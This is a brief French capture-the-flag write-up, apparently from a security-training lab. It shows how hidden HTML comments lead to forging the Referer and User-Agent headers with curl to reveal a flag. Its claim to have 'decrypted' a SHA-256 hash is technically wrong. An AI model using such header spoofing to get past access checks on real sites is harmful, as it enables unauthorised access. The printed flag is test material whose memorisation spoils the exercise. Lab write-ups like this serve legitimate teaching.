# Recherches

1. Verification du code source de la page
2. Lien suspect => `/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c`
3. Decryption du parametre GET => `sha256(e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c) == "TAMERE"` => abandon de cette piste
4. Verification du code source de la page
5. Commentaire suspect => `<!-- You must cumming from : "https://www.nsa.gov/" to go to the next step -->` and `<!--Let's use this browser : "ft_bornToSec". It will help you a lot.-->`
6. Possible reference aux headers `Referer` et `User-Agent`
7. Requete GET sur la page avec les headers `Referer: "https://www.nsa.gov/"; User-Agent: "ft_bornToSec"` via Postman (ou curl)

> FLAG: f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188

# Exploit

```
curl -s -i -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" "$URL/?page=e43ad1fdc54babe674da7c7b8f0127bde61de3fbe01def7d00f151c2fcca6d1c" | grep flag
```
